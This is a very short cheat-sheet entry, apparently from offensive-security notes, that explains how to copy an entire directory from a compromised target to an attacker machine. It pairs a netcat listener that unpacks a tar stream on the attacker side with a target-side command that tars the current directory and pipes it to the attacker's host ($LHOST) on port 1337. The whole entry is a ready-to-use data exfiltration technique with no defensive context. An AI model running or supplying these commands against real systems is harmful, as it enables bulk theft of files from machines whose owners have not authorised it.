## copy entire directory to attacker machine quickly by piping tar
attacker
```bash
# attacker
nc -lvnp 1337 | tar -xf -
# target
tar -cf - . | nc $LHOST 1337
```

